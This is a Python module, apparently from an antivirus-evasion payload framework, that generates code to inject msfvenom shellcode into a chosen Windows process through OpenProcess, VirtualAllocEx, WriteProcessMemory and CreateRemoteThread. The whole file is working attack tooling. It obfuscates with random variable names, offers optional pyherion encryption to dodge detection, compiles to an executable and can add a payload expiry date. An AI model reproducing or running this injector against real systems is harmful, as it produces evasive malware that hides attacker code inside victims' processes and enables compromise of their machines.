"""

Payload which injects shellcode into another process (similar to metasploit migrate functionality)

This obviously assumes you have the ability to write into the different process

Help with the injection code came from here - http://noobys-journey.blogspot.com/2010/11/injecting-shellcode-into-xpvista7.html

module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:

    def __init__(self):
        # required options
        self.description = "Payload which injects and executes shellcode into the memory of a process you specify."
        self.language = "python"
        self.rating = "Normal"
        self.extension = "py"

        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
                                    "PID_NUMBER"     : ["1234", "PID # to inject"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"]
                                 }

    def generate(self):
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                pid_num_variable = helpers.randomString()
                pagerwx_variable = helpers.randomString()
                processall_variable = helpers.randomString()
                memcommit_variable = helpers.randomString()
                shell_length_variable = helpers.randomString()
                memalloc_variable = helpers.randomString()
                prochandle_variable = helpers.randomString()
                kernel32_variable = helpers.randomString()

                # Create Payload code
                PayloadCode = 'from ctypes import *\n\n'
                PayloadCode += pagerwx_variable + ' = 0x40\n'
                PayloadCode += processall_variable + ' = 0x1F0FFF\n'
                PayloadCode += memcommit_variable + ' = 0x00001000\n'
                PayloadCode += kernel32_variable + ' = windll.kernel32\n'
                PayloadCode += ShellcodeVariableName + ' = \"' + Shellcode + '\"\n'
                PayloadCode += pid_num_variable + ' = ' + self.required_options["PID_NUMBER"][0] +'\n'
                PayloadCode += shell_length_variable + ' = len(' + ShellcodeVariableName + ')\n\n'
                PayloadCode += prochandle_variable + ' = ' + kernel32_variable + '.OpenProcess(' + processall_variable + ', False, ' + pid_num_variable + ')\n'
                PayloadCode += memalloc_variable + ' = ' + kernel32_variable + '.VirtualAllocEx(' + prochandle_variable + ', 0, ' + shell_length_variable + ', ' + memcommit_variable + ', ' + pagerwx_variable + ')\n'
                PayloadCode += kernel32_variable + '.WriteProcessMemory(' + prochandle_variable + ', ' + memalloc_variable + ', ' + ShellcodeVariableName + ', ' + shell_length_variable + ', 0)\n'
                PayloadCode += kernel32_variable + '.CreateRemoteThread(' + prochandle_variable + ', None, 0, ' + memalloc_variable + ', 0, 0, 0)\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                pid_num_variable = helpers.randomString()
                pagerwx_variable = helpers.randomString()
                processall_variable = helpers.randomString()
                memcommit_variable = helpers.randomString()
                shell_length_variable = helpers.randomString()
                memalloc_variable = helpers.randomString()
                prochandle_variable = helpers.randomString()
                kernel32_variable = helpers.randomString()

                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += pagerwx_variable + ' = 0x40\n'
                PayloadCode += processall_variable + ' = 0x1F0FFF\n'
                PayloadCode += memcommit_variable + ' = 0x00001000\n'
                PayloadCode += kernel32_variable + ' = windll.kernel32\n'
                PayloadCode += ShellcodeVariableName + ' = \"' + Shellcode + '\"\n'
                PayloadCode += pid_num_variable + ' = ' + self.required_options["PID_NUMBER"][0] +'\n'
                PayloadCode += shell_length_variable + ' = len(' + ShellcodeVariableName + ')\n\n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + prochandle_variable + ' = ' + kernel32_variable + '.OpenProcess(' + processall_variable + ', False, ' + pid_num_variable + ')\n'
                PayloadCode += '\t' + memalloc_variable + ' = ' + kernel32_variable + '.VirtualAllocEx(' + prochandle_variable + ', 0, ' + shell_length_variable + ', ' + memcommit_variable + ', ' + pagerwx_variable + ')\n'
                PayloadCode += '\t' + kernel32_variable + '.WriteProcessMemory(' + prochandle_variable + ', ' + memalloc_variable + ', ' + ShellcodeVariableName + ', ' + shell_length_variable + ', 0)\n'
                PayloadCode += '\t' + kernel32_variable + '.CreateRemoteThread(' + prochandle_variable + ', None, 0, ' + memalloc_variable + ', 0, 0, 0)\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode
